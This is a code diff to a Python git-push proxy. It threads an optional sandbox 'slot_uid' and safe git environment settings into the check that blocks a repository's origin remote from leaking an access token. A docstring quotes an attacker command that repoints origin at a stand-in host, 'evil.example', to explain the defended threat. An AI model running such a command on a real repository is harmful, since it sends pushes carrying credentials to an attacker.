@@ -13,6 +13,7 @@ from __future__ import annotations
 
 import asyncio
 import logging
+import os
 import subprocess
 from collections.abc import AsyncIterator
 from contextlib import asynccontextmanager
@@ -43,6 +44,7 @@ from robomp.git_ops import (
 )
 from robomp.github_client import GitHubClient, GitHubError
 from robomp.proxy_hmac import HEADER_SIGNATURE, HEADER_TIMESTAMP, verify
+from robomp.sandbox import _safe_directory_env, _slot_subprocess_kwargs
 from robomp.sandbox import workspace_key as compute_workspace_key
 
 log = logging.getLogger(__name__)
@@ -102,6 +104,14 @@ def _require_int(value: Any, field: str) -> int:
     return value
 
 
+def _optional_slot_uid(value: Any) -> int | None:
+    if value is None:
+        return None
+    if not isinstance(value, int) or isinstance(value, bool) or not (0 < value < 65536):
+        raise HTTPException(400, "missing/invalid 'slot_uid'")
+    return value
+
+
 def _optional_str_list(value: Any, field: str) -> list[str] | None:
     if value is None:
         return None
@@ -140,8 +150,10 @@ def _resolve_hmac_key(cfg: Settings) -> bytes:
 _ORIGIN_READ_TIMEOUT_SECONDS = 5.0
 
 
-def _read_origin_url(repo_dir: Path) -> str:
+def _read_origin_url(repo_dir: Path, slot_uid: int | None = None) -> str:
     """Return the worktree's `origin` remote URL, or raise HTTPException."""
+    env = {**os.environ, "GIT_TERMINAL_PROMPT": "0"}
+    env.update(_safe_directory_env(repo_dir))
     try:
         proc = subprocess.run(
             ["git", "-C", str(repo_dir), "remote", "get-url", "origin"],
@@ -149,6 +161,8 @@ def _read_origin_url(repo_dir: Path) -> str:
             text=True,
             check=False,
             timeout=_ORIGIN_READ_TIMEOUT_SECONDS,
+            env=env,
+            **_slot_subprocess_kwargs(slot_uid),
         )
     except subprocess.TimeoutExpired as exc:
         raise HTTPException(504, "timeout reading origin url") from exc
@@ -161,7 +175,7 @@ def _read_origin_url(repo_dir: Path) -> str:
     return proc.stdout.strip()
 
 
-def _assert_origin_safe_for_repo(repo_dir: Path, expected_repo: str) -> None:
+def _assert_origin_safe_for_repo(repo_dir: Path, expected_repo: str, slot_uid: int | None = None) -> None:
     """Refuse the push if the worktree's `origin` would leak the PAT.
 
     The PAT is injected via `--config-env http.extraHeader=…` (see
@@ -178,7 +192,7 @@ def _assert_origin_safe_for_repo(repo_dir: Path, expected_repo: str) -> None:
     `git remote set-url origin https://evil.example/x.git` and the proxy
     would happily push (with the PAT) to that remote.
     """
-    url = _read_origin_url(repo_dir)
+    url = _read_origin_url(repo_dir, slot_uid=slot_uid)
     parsed = urlparse(url)
     scheme = (parsed.scheme or "").lower()
     if scheme not in ("http", "https"):
@@ -561,6 +575,7 @@ def create_proxy_app(settings: Settings) -> FastAPI:
         workspace_key = _require_str(data.get("workspace_key"), "workspace_key")
         branch = _require_str(data.get("branch"), "branch")
         expected_head = _require_str(data.get("expected_head"), "expected_head")
+        slot_uid = _optional_slot_uid(data.get("slot_uid"))
         # Sanity-check workspace_key matches the repo claim.
         expected_prefix = repo.replace("/", "__") + "__"
         if not workspace_key.startswith(expected_prefix):
@@ -570,7 +585,7 @@ def create_proxy_app(settings: Settings) -> FastAPI:
             raise HTTPException(404, f"workspace not found: {workspace_key}")
         # Block attacker-controlled `origin` from being a PAT exfil channel.
         # MUST run BEFORE any subprocess that would inject the token header.
-        await asyncio.to_thread(_assert_origin_safe_for_repo, repo_dir, repo)
+        await asyncio.to_thread(_assert_origin_safe_for_repo, repo_dir, repo, slot_uid)
         try:
             result = await _run_git_op(
                 git_push,
@@ -578,6 +593,7 @@ def create_proxy_app(settings: Settings) -> FastAPI:
                 branch=branch,
                 expected_head=expected_head,
                 token=_resolve_token(settings),
+                slot_uid=slot_uid,
             )
         except HeadDriftError as exc:
             return _git_error_response(exc, head_drift=True)
